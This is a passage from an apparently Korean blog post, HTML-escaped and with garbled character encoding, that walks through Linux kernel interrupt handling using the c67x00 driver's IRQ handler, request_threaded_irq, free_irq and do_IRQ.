		&lt;span class=&quot;n&quot;&gt;dev_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cannot claim IRQ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_irq_failed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ëŸ°ì‹ìœ¼ë¡œ ì¸í„°ëŸ½íŠ¸ íë¥¼ ë“±ë¡í•´ ì‚¬ìš©í•˜ê²Œ ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqreturn_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;c67x00_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_device&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_sie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_ll_hpi_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRQ_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;c67x00_ll_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C67X00_SIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIEMSG_FLG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_ll_fetch_siemsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_ll_hpi_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;dev_warn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Not all interrupts handled! &quot;&lt;/span&gt;
			 &lt;span class=&quot;s&quot;&gt;&quot;status = 0x%04x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRQ_HANDLED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì¸í„°ëŸ½íŠ¸ í•¸ë“¤ëŸ¬ëŠ” íŒŒë¼ë¯¸í„°ë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;irq&lt;/code&gt;ë²ˆí˜¸ì™€ ë””ë°”ì´ìŠ¤ë¥¼ ë°›ê²Œ ëœë‹¤. ìœ„ì—ì„œ íì— ë“±ë¡í•  ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;request_threaded_irq&lt;/code&gt;ë¼ëŠ” í•¨ìˆ˜ì— ê·¸ëŒ€ë¡œ ë„£ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;request_threaded_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_handler_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			 &lt;span class=&quot;n&quot;&gt;irq_handler_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqflags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			 &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;devname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqaction&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_to_desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 2&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kzalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ENOMEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread_fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqflags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;devname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dev_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/kernel/irq/manage.c&lt;/code&gt;ì— êµ¬í˜„ë˜ì–´ìˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;irq&lt;/code&gt;ë²ˆí˜¸ë¡œ ì¸í„°ëŸ½íŠ¸ ë””ìŠ¤í¬ë¦½í„°ë¥¼ ê°€ì ¸ì˜¨ë‹¤.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;irqaction&lt;/code&gt;êµ¬ì¡°ì²´ë¥¼ ë§Œë“¤ê³  ê°’ì„ íƒœì›Œë„£ëŠ”ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;free_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_to_desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irqaction&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;devname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WARN_ON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq_settings_is_per_cpu_devid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#ifdef CONFIG_SMP
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WARN_ON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;affinity_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;affinity_notify&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__free_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dev_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;devname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;devname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXPORT_SYMBOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;free_irq&lt;/code&gt;ë¡œ ë“±ë¡ëœ &lt;code class=&quot;highlighter-rouge&quot;&gt;irq&lt;/code&gt;ë¥¼ ì§€ìš¸ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * do_IRQ handles all normal device IRQ's (the special
 * SMP cross-CPU interrupts have their own specific
 * handlers).
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;__visible&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__irq_entry&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_IRQ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;set_irq_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
